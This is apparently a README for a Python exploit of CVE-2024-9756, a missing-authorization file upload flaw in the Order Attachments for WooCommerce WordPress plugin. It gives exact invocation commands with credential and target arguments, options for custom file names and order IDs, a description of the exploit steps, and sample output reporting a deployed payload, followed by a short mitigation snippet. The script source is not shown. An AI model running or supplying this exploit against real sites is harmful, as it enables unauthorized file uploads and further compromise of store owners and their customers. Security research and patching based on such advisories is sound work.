# 🚀 WooCommerce Arbitrary File Upload Exploit (CVE-2024-9756)

## 📌 Overview
This exploit leverages an **unauthorized limited arbitrary file upload vulnerability** in the *Order Attachments for WooCommerce* plugin (versions **2.0 to 2.4.1**) for WordPress.  
The vulnerability allows **authenticated users (Subscriber+)** to upload restricted file types without proper authorization.

### ⚠️ Disclaimer
> **This script is for educational and security research purposes only.**
> Any unauthorized use of this exploit on systems you do not own is strictly illegal.

---

## 🔗 CVE Details
- **CVE ID:** CVE-2024-9756
- **Vulnerable Plugin:** Order Attachments for WooCommerce
- **Affected Versions:** 2.0 to 2.4.1
- **Vulnerability Type:** **Missing Authorization to Authenticated Arbitrary File Upload**
- **Exploitation Prerequisite:** *Valid WordPress login with at least "Subscriber" role*
- **Potential Impact:** Limited file uploads that can be used for further exploitation.

---

## ⚙️ Requirements
Ensure you have the following before running the exploit:

### ✅ Dependencies
- Python 3.x  
- `requests` module → Install with:
  ```sh
  pip install requests
  ```
- Target WordPress site with the vulnerable plugin installed.

### ✅ WordPress User Permissions
- Requires **Subscriber+** access to exploit.

---

## 🚀 Exploit Usage
### **🔹 Running the Exploit**
```sh
python3 CVE-2024-9756.py -u <TARGET_URL> -un <USERNAME> -p <PASSWORD>
```
**Example:**
```sh
python3 CVE-2024-9756.py -u http://192.168.100.74:888/wordpress4 -un khaled -p mypassword
```

---

## 🔧 Advanced Usage
You can specify **custom file names** and **order IDs**:

### **🔹 Upload a specific file**
```sh
python3 CVE-2024-9756.py -u <TARGET_URL> -un <USERNAME> -p <PASSWORD> --filename="custom.png" --filetype="image/png"
```

### **🔹 Attach file to a different Order ID**
```sh
python3 CVE-2024-9756.py -u <TARGET_URL> -un <USERNAME> -p <PASSWORD> -o 200
```

---

## 📌 Script Behavior
1. **Authenticates with WordPress** using the provided credentials.
2. **Verifies the file exists locally** before uploading.
3. **Executes the file upload exploit** via the vulnerable AJAX endpoint.
4. **Parses the server response** and extracts the uploaded file URL.

---

## ✅ Expected Output
If successful, the script will return the uploaded file URL:
```sh
[*] Initiating authentication...
[✔] Authentication successful.
[*] Deploying payload: Nxploit.jpg to order 196...
[✔] Payload successfully deployed!
🔗 File URL: http://192.168.100.74:888/wordpress4/wp-content/uploads/2025/03/Nxploit.jpg
```

---

## 🔥 Mitigation & Fixes
- **Upgrade the plugin** to the latest patched version.
- **Restrict file upload permissions** to Admins only.
- **Modify `functions.php`** to block `wp_ajax_wcoa_add_attachment` from unauthorized users:
  ```php
  if (!current_user_can('manage_woocommerce')) {
      wp_send_json_error(['message' => 'Unauthorized'], 403);
      exit;
  }
  ```

---

## 🛑 Legal Notice
> **This exploit is published for educational purposes and security research only.**  
> **Unauthorized use against systems without explicit permission is illegal and punishable under cybersecurity laws.**  
> **Use at your own risk.**  

---
